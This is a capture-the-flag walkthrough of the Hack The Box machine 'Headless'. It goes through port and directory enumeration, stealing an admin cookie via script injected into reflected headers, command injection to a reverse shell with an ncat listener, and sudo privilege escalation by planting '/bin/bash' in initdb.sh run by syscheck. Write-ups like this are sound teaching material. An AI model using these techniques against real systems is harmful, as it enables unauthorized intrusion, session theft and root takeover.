# Headless

## Headless

## Description

<div align="center">

<img src="https://labs.hackthebox.com/storage/avatars/26e076db204a74b99390e586d7ebcf8c.png" alt="" height="200" width="200">

</div>

## Headless

### Walk through

#### Enumeration

**Port Enumeration**

Basic PORT enumeration with NMAP

```Bash
nmap -Pn -n -p- --min-rate 5000 --open $TARGET
```

_Note: in my case $TARGET is 192.168.1.69_

The reported ports are

```Bash
PORT     STATE 
22/tcp   open
5000/tcp open
```

**Service Enumeration**

Now lets enumerate the services running on each port with

```Bash
nmap -sCV -p $PORTS --min-rate 5000 $TARGET
```

Output

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
...SNIP...
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
...SNIP...
```

**5000**

The port 5000 hosted a web page, here is the index displayed ![index](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/f6131141-1aef-43cf-a652-ff781539f1ab)

**FUZZING**

After knowing that there is a web server lets try to FUZZ other directories I use the _directory-list-lowercase-2.3-medium.txt_ from SECLIST and WFUZZ

Last command:

```Bash
wfuzz --hc 404 -w ~/Wordlists/directory-list-lowercase-2.3-medium.txt http://10.10.11.8:5000/FUZZ
```

The output give a _support_ and _dashboard_ path ![fuzzing](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/33c470a0-5ddb-4cdf-80b3-4efb3758b952)

**support**

![support](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/dab5a760-6cbb-477d-8d48-d45bde5ff5f9)

**dashboard**

![Dashboard](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/2e7908fb-31dd-4ecf-a6c1-17436dc522c7)

**Cookie**

Also we can see a cookie, by the name we can suppose this cookie manage the role of the client. After look the message of the _/dashboard_ lets try to manipulate this element ![Pasted image 20240404223459](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/631afe1f-fb80-4197-a467-74598c1e059c)

#### Exploitation

**Cookie**

After play a wile with the behavior of _/support_ the request loos interesting to do something

After try with the classic HTML Injection we can see a warning screen ![Pasted image 20240404224403](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/f3b1aaf9-5daf-4542-ba6d-6c428f82891e)

I tried a lot of bypasses bunt nothing works The warning screen reflect the headers of the client request, so lets try with that First over message an error is caused Then lets add a simple Script Injection to do a fetch to our simple server This request would have embedded the cookie of the client, in this case the client is the server, this theoretically should sen to us the admin cookie ![Pasted image 20240404230128](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/92a2bd7d-5806-4300-942c-aafe198aaa81)

BINGO We can see a different cookie, so lets modify us cookie with this one ![Pasted image 20240404230710](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/bd77d587-d86f-4561-aa30-ea68f7153d79)

Now we have access ![Pasted image 20240404230947](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/f745bb79-8e5e-4c38-83ba-a27a0a538afc)

Testing the function of the dashboard a report is generated This page no have a real functionality besides inform the state of the server With the basics

**Command Injection**

Before do any try, open a nc listener ready to get a rev shell

```Bash
ncat -lvnp 1234
```

![Pasted image 20240404232051](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/bdf5ffe4-2d51-403f-a2af-580fe439b675)

Testing some commands to send a shell a nice one appear ![commandInjection](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/b762b875-821b-4628-a6ec-4d4dda537e8f)

Now get the shell

![ncat](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/f0b5cb33-e245-4d19-be8e-e3bde0d6809b)

**User flag**

In the home directory of the user is the user.txt flag

![user](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/ae9f709e-b19f-45fa-bcd0-953d608ed603)

#### Post-Explotation

**Privilege Escalation**

To do a Privilege escalation use

```Bash
sudo -l
```

![Pasted image 20240404232827](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/92a192cf-0df9-40fe-b0cd-9428ae1e7fad)

There are a binary no password needed to execute like super user A few queries on google found an article talking about privilege escalation with syscheck [here](https://medium.com/@adiamond186/usr-bin-syscheck-is-looking-for-the-initdb-sh-609cd006d913)

syschecks execute initdb.sh file if you modifies this file the content is executed like sudo user Create the initdb.sh file wth "/bin/bash" in the content and add execution permissions

```Bash
touch initdb.sh && echo "/bin/bash" > initdb.sh && chmod +x initdb.sh
```

Next, when executes the command:

```Bash
sudo syscheck
```

Your initdb.sh file is executed To test if your file is executed successful use `id` command ![Pasted image 20240404233937](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/515a33d5-f49d-404c-94e3-b6d2dc67bbfa)

**Root flag**

On the root home directory is the root flag

![Pasted image 20240404234350](https://github.com/CesarGBkR/Pentesting-Notes/assets/99093357/f3c9e8d2-ef63-4dd7-a91b-3825dd572458)

## References

https://medium.com/@adiamond186/usr-bin-syscheck-is-looking-for-the-initdb-sh-609cd006d913
